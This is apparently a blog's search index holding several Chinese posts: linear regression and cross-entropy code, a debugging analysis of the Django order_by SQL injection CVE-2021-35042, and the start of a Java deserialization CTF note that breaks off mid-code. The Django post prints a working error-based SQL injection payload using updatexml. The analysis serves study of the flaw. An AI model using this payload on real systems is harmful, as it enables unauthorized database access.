<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Easy Linear Regression</title>
    <url>/2022/06/20/Linear-Regression/</url>
    <content><![CDATA[<p><a href="https://d2l.ai/chapter_linear-networks/linear-regression.html">https://d2l.ai/chapter_linear-networks/linear-regression.html</a> 对该篇文章进行代码实现<br><span id="more"></span></p>
<h2 id="1-基本流程"><a href="#1-基本流程" class="headerlink" title="1.基本流程"></a>1.基本流程</h2><p>首先需要有一个梯度下降算法 梯度下降算法可以参考<a href="https://www.zhihu.com/question/305638940/answer/1639782992">https://www.zhihu.com/question/305638940/answer/1639782992</a><br>再就是损失函数的实现</p>
<p>那么整套的基本流程就是</p>
<blockquote>
<ul>
<li>设计基本模型，再本章中我们要实现预测房价的走向 <strong>（完全不准 损失值<em>loss</em> 过大 主要是设计思路）</strong><script type="math/tex; mode=display">
y= w_{\mathrm{area}} \cdot area + w_{\mathrm{age}} \cdot age + b + \epsilon</script>$ \epsilon $是损失值，b是偏差值，两个w为权重</li>
<li>读取房龄和面积的基本数据（广州房价数据） <a href="data.csv" title="data下载">点击下载</a></li>
<li>随机抽取部分样本进行梯度下降，如此往复一定次数，最后得出训练结果</li>
</ul>
</blockquote>
<h2 id="2-提取数据"><a href="#2-提取数据" class="headerlink" title="2.提取数据"></a>2.提取数据</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = pd.read_csv(<span class="string">&quot;data.csv&quot;</span>)</span><br><span class="line">data = np.array(data)</span><br><span class="line">features = data[:,<span class="number">1</span>:<span class="number">3</span>] <span class="comment">#获取房子面积和房子建造日期</span></span><br><span class="line">features[:,<span class="number">0</span>] = <span class="number">2022</span> - features[:,<span class="number">0</span>] <span class="comment">#获取房龄</span></span><br><span class="line">labels = data[:,<span class="number">0</span>] <span class="comment">#获取房价</span></span><br></pre></td></tr></table></figure>
<p>对样本进行随机抽样，每次返回batch_size个真实样本数据<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">data_iter</span>(<span class="params">batch_size, features, labels</span>):</span><br><span class="line">    num_examples = <span class="built_in">len</span>(features)</span><br><span class="line">    indices = <span class="built_in">list</span>(<span class="built_in">range</span>(num_examples))</span><br><span class="line">    <span class="comment"># The examples are read at random, in no particular order</span></span><br><span class="line">    random.shuffle(indices)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, num_examples, batch_size):</span><br><span class="line">        batch_indices = np.array(</span><br><span class="line">            indices[i: <span class="built_in">min</span>(i + batch_size, num_examples)])</span><br><span class="line">        <span class="keyword">yield</span> features[batch_indices], labels[batch_indices]<span class="comment">#已经完成去重操作了，用这种模式</span></span><br></pre></td></tr></table></figure></p>
<h2 id="3-设计基本的函数"><a href="#3-设计基本的函数" class="headerlink" title="3. 设计基本的函数"></a>3. 设计基本的函数</h2><ul>
<li><p>损失函数 (loss function)<br><script type="math/tex">\dfrac{(\hat{y}-y)^2}{2}</script> 预估值与实际值的差，式子求导后可以得到实际差值，代码实现如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">squared_loss</span>(<span class="params">y_hat, y</span>):</span><br><span class="line">    <span class="keyword">return</span> (y_hat - y.reshape(y_hat.shape)) ** <span class="number">2</span> / <span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>y_hat是预测值，y是实际房价</p>
</li>
<li><p>梯度下降 (gradient descent)</p>
<script type="math/tex; mode=display">(\mathbf{w},b) - \frac{lr}{|\mathcal{batchsize}|} \sum_{i \in \mathcal{B}} \partial_{(\mathbf{w},b)} l^{(i)}(\mathbf{w},b).</script><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sgd</span>(<span class="params">params, lr, batch_size</span>):</span><br><span class="line">    <span class="keyword">for</span> param <span class="keyword">in</span> params:</span><br><span class="line">        param[:] = param - lr * param.grad / batch_size</span><br></pre></td></tr></table></figure>
<p>lr是步长，一般都用较小值0.00001这样的<br>params就是前面公式的w，b</p>
</li>
<li><p>线性回归（linear regression）</p>
<script type="math/tex; mode=display">y= w_{\mathrm{area}} \cdot area + w_{\mathrm{age}} \cdot age + b</script><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">linreg</span>(<span class="params">X, w, b</span>):</span><br><span class="line">    <span class="keyword">return</span> np.dot(X, w) + b</span><br></pre></td></tr></table></figure>
<p>w是一个矩阵，w=[w_area,w_age]<br>X是真实数据<br>他们点乘可得到预测值</p>
</li>
</ul>
<h2 id="4-最后算法"><a href="#4-最后算法" class="headerlink" title="4.最后算法"></a>4.最后算法</h2><p>首先让步长等于0.0000000001，这种一般是猜出来的<br>循环次数为10<br>样本大小为10<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lr = <span class="number">0.0000000001</span></span><br><span class="line">num_epochs = <span class="number">10</span></span><br><span class="line">batch_size = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(num_epochs):</span><br><span class="line">    <span class="keyword">for</span> X, y <span class="keyword">in</span> data_iter(batch_size, features, labels):<span class="comment">#X，y为抽样结果</span></span><br><span class="line">        <span class="keyword">with</span> autograd.record():</span><br><span class="line">            y_hat = linreg(X, w, b)<span class="comment">#得到预测值（初始w，b需设置多组，因为梯度下降法是在局部中找到极值，可能在其它地方也有极值点）</span></span><br><span class="line">            l = squared_loss(y_hat, y) <span class="comment">#算出损失</span></span><br><span class="line">        l.backward()<span class="comment">#求积分</span></span><br><span class="line">        sgd([w, b], lr, batch_size) <span class="comment">#梯度下降</span></span><br><span class="line">    train_l = squared_loss(linreg(features, w, b), labels)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;epoch <span class="subst">&#123;epoch + <span class="number">1</span>&#125;</span>, loss <span class="subst">&#123;<span class="built_in">float</span>(train_l.mean()):f&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br></pre></td></tr></table></figure></p>
<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>这应该是最简单的模型了，最后运行偏差值过大，应该是因为这个本事影响参数（权重）太少了，只有房龄和面积，所以无法预测，如果用散点图plt去看，也会看到他太过分散。还需要继续去学习，看英语文章太痛苦了，但是也得习惯</p>
]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>implement of cross entropy loss</title>
    <url>/2022/06/22/implement-of-cross-entropy-loss/</url>
    <content><![CDATA[<p>首先来看看交叉熵函数公式是怎么样的</p>
<script type="math/tex; mode=display">l(\mathbf{y}, \hat{\mathbf{y}}) = - \sum_{j=1}^q y_j \log \hat{y}_j.</script><span id="more"></span>
<p>此方法多用于分类问题，也就是每个种类概率为多少，最后得出一个向量vector<br>可以看看这篇文章的解释<br><a href="https://d2l.ai/chapter_linear-networks/softmax-regression.html">https://d2l.ai/chapter_linear-networks/softmax-regression.html</a></p>
<blockquote>
<p>The component corresponding to particular instance’s category is set to 1 and all other components are set to 0. In our case, a label $y$ would be a three-dimensional vector, with $(1, 0, 0)$ corresponding to “cat”, $(0, 1, 0)$ to “chicken”, $(0, 0, 1)$ and to “dog”</p>
</blockquote>
<p>大致意思是用向量来表示每个物种<br>如果我们测出了一个图片的分类概率是 $\hat{y} = (0.2,0.3,0.5)$，而实际上这个物种是一个狗，也就是 $y= (0,0,1)$，那么预测值与实际值的损失是多少呢？<br>那么就要用到上面的cross-entropy，交叉熵函数了<br>把上面的向量带入公式，可以得到 <script type="math/tex">l(\mathbf{y}, \hat{\mathbf{y}}) = -(0\cdot \log 0.2+0\cdot \log 0.3+1\cdot \log 0.5)</script><br>那么观察可以发现，除了真实项，其它都为0，那么设计代码的时候可以直接预测值里面那个与实际项对应的数求对数<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cross_entropy</span>(<span class="params">y_hat, y</span>):</span><br><span class="line">    <span class="keyword">return</span> - np.log(y_hat[<span class="built_in">range</span>(<span class="built_in">len</span>(y_hat)), y])</span><br><span class="line">y_hat = np.array([[<span class="number">0.1</span>, <span class="number">0.3</span>, <span class="number">0.6</span>], [<span class="number">0.3</span>, <span class="number">0.2</span>, <span class="number">0.5</span>],[<span class="number">0.2</span>,<span class="number">0.7</span>,<span class="number">0.1</span>],[<span class="number">0.8</span>,<span class="number">0.1</span>,<span class="number">0.1</span>]])</span><br><span class="line">y=(<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">cross_entropy(y_hat, y)</span><br></pre></td></tr></table></figure><br>y代表每一组样本中，实际值，比如1代表$(0,1,0)$,2代表$(0,0,1)$<br>显示结果就是<br><code>array([1.2039728, 0.6931472, 1.609438 , 2.3025851])</code><br>可以用计算器算一下-log(0.3),-log(0.5),就是上面的结果</p>
]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>python</tag>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title>cve-2021-35042 django sql注入 调试分析</title>
    <url>/2022/06/10/cve-2021-35042/</url>
    <content><![CDATA[<ul>
<li><h2 id="1-如何调试django"><a href="#1-如何调试django" class="headerlink" title="1.如何调试django"></a>1.如何调试django</h2><blockquote>
<p>因为只能找到一些分析文章，但是感觉不透彻，自己干看代码又太难了，google半天找到一个好调试django的方法，结合我自己的一些思路可以调到django源码，而不是单纯调试二次开发的代码，本篇将尽可能从不知道这个函数存在漏洞开始讲解</p>
 <span id="more"></span>
<p>如果想调试二次开发的代码，可以参考以下链接<br> <a href="https://code.visualstudio.com/docs/python/tutorial-django">https://code.visualstudio.com/docs/python/tutorial-django</a><br> 这是vscode的<br><br> 首先需要安装对应版本的django，可以使用以下链接进行搭建博客<br> <a href="https://github.com/H3rmesk1t/Django-SQL-Inject-Env/tree/main/CVE-2021-35042">https://github.com/H3rmesk1t/Django-SQL-Inject-Env/tree/main/CVE-2021-35042</a><br><br> 最好使用python虚拟环境进行搭建，这样就能更方便进行多版本操作<br> 这是官方的搭建python虚拟环境方法<br> <a href="https://docs.python.org/3.8/library/venv.html#creating-virtual-environments">https://docs.python.org/3.8/library/venv.html#creating-virtual-environments</a><br> 我这里就不多介绍了<br><br> 那么搭建完成以后，如何进行调试django<br> StackOverflow上面的方法就是用pdb进行断点调试<br> <code>pdb.set_trace()</code></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vuln</span>(<span class="params">request</span>):</span><br><span class="line">    query = request.GET.get(<span class="string">&#x27;order_by&#x27;</span>, default=<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    pdb.set_trace()</span><br><span class="line">    res = User.objects.order_by(query)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(res.values())</span><br></pre></td></tr></table></figure>
<p>我在order_by前面加上了一个断点，在命令行执行<br> <code>python app.py runserver 127.0.0.1:8000</code><br> 然后访问一下<br> <a href="http://127.0.0.1:8000/vuln/?order_by=id">http://127.0.0.1:8000/vuln/?order_by=id</a><br> <img src="/2022/06/10/cve-2021-35042/1.jpg" alt><br> 可以看到进入了断点<br> 在这里介绍一下几个常用命令</p>
<blockquote>
<p>n: 相当于vscode里面的跨越，也就是执行一条语句，如果是函数就跨越里面<br> s: 就是步进，可以执行到函数里面<br> a: 查看当前变量<br> w: 查看调用堆栈<br> p variable: 查看变量，当然也可以直接输入变量名<br> l: 查看当前上下11行代码<br> c: continue继续执行到下一个断点，如果没有就直接全部执行</p>
</blockquote>
<p><a href="https://docs.python.org/3/library/pdb.html">https://docs.python.org/3/library/pdb.html</a>这是pdb相关文档<br><br>接下来配合vscode，或者其它编辑器，就可以开始代码审计了</p>
</blockquote>
</li>
<li><h2 id="2-开始审计"><a href="#2-开始审计" class="headerlink" title="2.开始审计"></a>2.开始审计</h2><blockquote>
<p>首先需要知道order_by这段源码在哪里，我们可以直接去官网查看数据库相关源码，然后再在本地去寻找<br> <a href="https://docs.djangoproject.com/en/2.0/_modules/django/db/models/query/">https://docs.djangoproject.com/en/2.0/_modules/django/db/models/query/</a><br> 这就是数据库相关源码，在虚拟环境打开这个文件，找到order_by，我这里是<code>C:\Users\xxxxx\\.virtualenvs\django3.2-H6Gg1cu_\Lib\site-packages\django\db\models\query.py</code><br> 然后下断点，在这里说一下题外话</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">vuln</span>(<span class="params">request</span>):</span><br><span class="line">    query = request.GET.get(<span class="string">&#x27;order_by&#x27;</span>, default=<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    res = User.objects.order_by(query)<span class="comment">#这一段并不会执行sql语句</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(res.values())<span class="comment">#他调用了values才会执行</span></span><br></pre></td></tr></table></figure>
<p>继续断点，找到order_by，在这下断点<br> <img src="/2022/06/10/cve-2021-35042/2.jpg" alt><br> 下了断点以后，重启服务器，浏览器访问使用了order_by的那个操作页面,我这里是<br> <a href="http://127.0.0.1:8000/vuln/?order_by=id">http://127.0.0.1:8000/vuln/?order_by=id</a><br> 命令行就会断到这里<br> <img src="/2022/06/10/cve-2021-35042/3.jpg" alt><br> 可以看到确实进来了<br> 输入field_names，可以看到是我们get的参数<br> <img src="/2022/06/10/cve-2021-35042/4.jpg" alt><br> 那么输入s，进入clear_ordering，看看执行了什么<br> <img src="/2022/06/10/cve-2021-35042/5.jpg" alt><br> 可以看到是先执行了这个装饰器函数，因为没有对我们的field_names执行操作，所以就跳过，来到clear_ordering里面<br> <img src="/2022/06/10/cve-2021-35042/6.jpg" alt><br> 只是清空了一些操作，可能是防止上一次order_by的操作对这一次产生影响（如果其它开发人员多次使用了order_by这个函数）但是还是没有对我们的field_names进行过滤什么的，那么就继续，步进到add_ordering里面 <strong>(这里就是关键操作了)</strong><br> 从pdb可以看出，add_ordering在<code>\db\models\sql\query.py</code>这个文件中，用vscode打开</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> ordering:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">isinstance</span>(item, <span class="built_in">str</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> item:</span><br><span class="line">        warnings.warn(</span><br><span class="line">            <span class="string">&#x27;Passing column raw column aliases to order_by() is &#x27;</span></span><br><span class="line">            <span class="string">&#x27;deprecated. Wrap %r in a RawSQL expression before &#x27;</span></span><br><span class="line">            <span class="string">&#x27;passing it to order_by().&#x27;</span> % item,</span><br><span class="line">            category=RemovedInDjango40Warning,</span><br><span class="line">            stacklevel=<span class="number">3</span>,</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> item == <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> item.startswith(<span class="string">&#x27;-&#x27;</span>):</span><br><span class="line">        item = item[<span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">if</span> item <span class="keyword">in</span> self.annotations:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> self.extra <span class="keyword">and</span> item <span class="keyword">in</span> self.extra:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="comment"># names_to_path() validates the lookup. A descriptive</span></span><br><span class="line">    <span class="comment"># FieldError will be raise if it&#x27;s not.</span></span><br><span class="line">    self.names_to_path(item.split(LOOKUP_SEP), self.model._meta)</span><br><span class="line"><span class="keyword">elif</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(item, <span class="string">&#x27;resolve_expression&#x27;</span>):</span><br><span class="line">    errors.append(item)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">getattr</span>(item, <span class="string">&#x27;contains_aggregate&#x27;</span>, <span class="literal">False</span>):</span><br><span class="line">    <span class="keyword">raise</span> FieldError(</span><br><span class="line">        <span class="string">&#x27;Using an aggregate in order_by() without also including &#x27;</span></span><br><span class="line">        <span class="string">&#x27;it in annotate() is not allowed: %s&#x27;</span> % item</span><br><span class="line">    )</span><br><span class="line"><span class="keyword">if</span> errors:</span><br><span class="line">    <span class="keyword">raise</span> FieldError(<span class="string">&#x27;Invalid order_by arguments: %s&#x27;</span> % errors)</span><br><span class="line"><span class="keyword">if</span> ordering:</span><br><span class="line">    self.order_by += ordering</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    self.default_ordering = <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>可以看到一行注释<br> <code># names_to_path() validates the lookup. A descriptive FieldError will be raise if it&#39;s not.</code><br> 那么这一行大概就是对参数进行过滤的，可以看看里面的重要代码</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path, names_with_path = [], []</span><br><span class="line"><span class="keyword">for</span> pos, name <span class="keyword">in</span> <span class="built_in">enumerate</span>(names):</span><br><span class="line">cur_names_with_path = (name, [])</span><br><span class="line"><span class="keyword">if</span> name == <span class="string">&#x27;pk&#x27;</span>:</span><br><span class="line">    name = opts.pk.name</span><br><span class="line"></span><br><span class="line">field = <span class="literal">None</span></span><br><span class="line">filtered_relation = <span class="literal">None</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    field = opts.get_field(name)</span><br><span class="line"><span class="keyword">except</span> FieldDoesNotExist:</span><br></pre></td></tr></table></figure>
<p>注意到这个<code>opts.get_field</code>,是提取表名的一个函数，从缓存中提取，而不是进行sql操作，有兴趣的可以自己进行调试，这里不做过多赘述，总之就是如果不存在这个表就会抛出异常，那么add_ordering里面的<code>self.order_by += ordering</code>就无法执行<br> <img src="/2022/06/10/cve-2021-35042/14.jpg" alt><br> 而order_by在上一个clear_ordering被清空了，<strong>执行sql操作的时候会使用到self.order_by操作</strong><br> 那么就需要绕过这个<code>names_to_path()</code><br><br> 先继续我们的pdb操作<br> 输入ordering<br> <img src="/2022/06/10/cve-2021-35042/7.jpg" alt><br> 可以看到<code>for item in ordering:</code>这个循环就是要遍历我们url里面的get参数，也就是order_by这个参数<br> <a href="http://127.0.0.1:8000/vuln/?order_by=id">http://127.0.0.1:8000/vuln/?order_by=id</a><br> 而这个循环只会循环一次，因为我们元组只有一个<br> 而names_to_path()也在循环里面，而且在最后执行，也就是说如果在中途跳出这个循环，那么也就是跳出了整个循环，也就不会进行检测我们的参数。<br> 看回到这个循环操作代码</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> ordering:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(item, <span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> item:</span><br><span class="line">            warnings.warn(</span><br><span class="line">                <span class="string">&#x27;Passing column raw column aliases to order_by() is &#x27;</span></span><br><span class="line">                <span class="string">&#x27;deprecated. Wrap %r in a RawSQL expression before &#x27;</span></span><br><span class="line">                <span class="string">&#x27;passing it to order_by().&#x27;</span> % item,</span><br><span class="line">                category=RemovedInDjango40Warning,</span><br><span class="line">                stacklevel=<span class="number">3</span>,</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> item == <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> item.startswith(<span class="string">&#x27;-&#x27;</span>):</span><br><span class="line">            item = item[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> item <span class="keyword">in</span> self.annotations:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> self.extra <span class="keyword">and</span> item <span class="keyword">in</span> self.extra:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># names_to_path() validates the lookup. A descriptive</span></span><br><span class="line">        <span class="comment"># FieldError will be raise if it&#x27;s not.</span></span><br><span class="line">        self.names_to_path(item.split(LOOKUP_SEP), self.model._meta)</span><br></pre></td></tr></table></figure>
<p>这几个if里面有continue操作，如果进去了一个，就可以跳出这个循环，而不执行<code>names_to_path</code><br> 首先看第一个</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> item:</span><br><span class="line">    warnings.warn(</span><br><span class="line">        <span class="string">&#x27;Passing column raw column aliases to order_by() is &#x27;</span></span><br><span class="line">        <span class="string">&#x27;deprecated. Wrap %r in a RawSQL expression before &#x27;</span></span><br><span class="line">        <span class="string">&#x27;passing it to order_by().&#x27;</span> % item,</span><br><span class="line">        category=RemovedInDjango40Warning,</span><br><span class="line">        stacklevel=<span class="number">3</span>,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<p>如果参数中有”.”，就会跳出，这是程序员想着可以使用这种方式<br> table.collection方式用表名和collection，来进行排序，下面这段是思路拓宽，但是没什么用，不想看可以跳过</p>
<blockquote>
<p>那么这时候可能就有人想，能不能访问到其它表中的数据，我们可以试一下，不打断点，直接访问其它表，比如下图这个<br> <img src="/2022/06/10/cve-2021-35042/8.jpg" alt><br> 我们试一下<br> <a href="http://127.0.0.1:8000/vuln/?order_by=django_migrations.name">http://127.0.0.1:8000/vuln/?order_by=django_migrations.name</a><br> <img src="/2022/06/10/cve-2021-35042/9.jpg" alt><br> 可以看到报错了，这时候要找到具体是什么问题<br> 由上面报错信息可以得知<br> <code>File &quot;C:\Users\xxxxx\.virtualenvs\django3.2-H6Gg1cu_\lib\site-packages\django\db\backends\mysql\base.py&quot;, line 75, in execute
 return self.cursor.execute(query, args)</code><br> 在base.py中75行下个断点，看看query具体都是是什么<br> <img src="/2022/06/10/cve-2021-35042/10.jpg" alt><br> 这是第一个query，应该是写死的了，看第二个<br> <img src="/2022/06/10/cve-2021-35042/11.jpg" alt><br> 这就是我们想要的了<br> <code>SELECT `vuln_app_user`.`id`, `vuln_app_user`.`name` FROM `vuln_app_user` ORDER BY (`django_migrations`.name) ASC</code><br> 也就是他前面都是写死的了，order by后面才是我们get参数的，所以不能访问其它表</p>
</blockquote>
<p>那我们回到刚刚循环处<br> 我们可以通过”.”来绕过<br> payload可以写成这样<br> <code>vuln_app_user.id);select updatexml(1, concat(0x7e,(select @@version)),1)%23</code><br> 这个”.”就在vuln_app_user.id这<br><br> 那么有人可能会想，如果把点加到其它地方行不行<br> 那就继续执行，看看到底行不行<br> 前面说过，真正执行sql操作是在<code>res.values()</code>的时候<br> 那就换个地方打断点，把之前的断点撤掉</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">vuln</span>(<span class="params">request</span>):</span><br><span class="line">    query = request.GET.get(<span class="string">&#x27;order_by&#x27;</span>, default=<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    res = User.objects.order_by(query)</span><br><span class="line">    pdb.set_trace()</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(res.values())</span><br></pre></td></tr></table></figure>
<p>重新进行访问<br> 因为我们需要看的是self.query.order_by这个参数，所以就在调试的时候尽可能快进到有这个参数的地方<br> <img src="/2022/06/10/cve-2021-35042/12.jpg" alt><br> 最后来到这里<br> field就是query.order_by这个参数，可以用ll命令看多行代码<br> <img src="/2022/06/10/cve-2021-35042/13.jpg" alt></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">table, col = col.split(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">order_by.append((</span><br><span class="line">    OrderBy(</span><br><span class="line">        RawSQL(<span class="string">&#x27;%s.%s&#x27;</span> % (self.quote_name_unless_alias(table), col), []),</span><br><span class="line">        descending=descending</span><br><span class="line">    ), <span class="literal">False</span>))</span><br></pre></td></tr></table></figure>
<p>他会将点的位置进行切分，然后再给table加上反引号再去拼接，也就是如果我们随便加个点<br> 比如<br> <code>id.);select updatexml(1, concat(0x7e,(select @@version)),1)%23</code><br> 那他就会变为</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`id`.);select updatexml(1, concat(0x7e,(select @@version)),1)%23</span><br></pre></td></tr></table></figure>
<p>那样就会直接报错，而不是报后面updatexml的报错注入<br>当然也应该有其它绕过方式，比如多加个反引号之类进行闭合，但是我也不太懂，</p>
</blockquote>
</li>
<li><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h2><blockquote>
<p>主要问题就是可以绕过names_to_path的检测，然后把恶意代码直接拼接进去，但是可能需要知道数据表名称才能注入，我也不太清楚如何能不靠数据表进行注入，希望有大佬懂得话可以评论留言</p>
</blockquote>
</li>
</ul>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>sql注入</tag>
        <tag>代码审计</tag>
        <tag>django</tag>
      </tags>
  </entry>
  <entry>
    <title>java transient反序列化</title>
    <url>/2022/08/02/java-transient%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><p>遇到ctf题目里面需要反序列化transient关键字的变量<br>但是transient关键字修饰的变量是不进入反序列的<br><span id="more"></span><br>下面是部分代码<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testC</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String age;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> String height;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">testC</span><span class="params">(String name, String age, String height)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.height = height;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHeight</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.height;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHeight</span><span class="params">(String height)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.height = height;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        <span class="built_in">this</span>.height = (String)s.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span> == obj) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> testC) &#123;</span><br><span class="line">            <span class="type">testC</span> <span class="variable">user</span> <span class="operator">=</span> (testC)obj;</span><br><span class="line">            <span class="keyword">return</span> user.getAge().equals(<span class="built_in">this</span>.age) &amp;&amp; user.getHeight().equals(<span class="built_in">this</span>.height) &amp;&amp; user.getName().equals(<span class="built_in">this</span>.name);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;name=&#x27;&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&#x27;\&#x27;&#x27;</span> + <span class="string">&quot;, age=&#x27;&quot;</span> + <span class="built_in">this</span>.age + <span 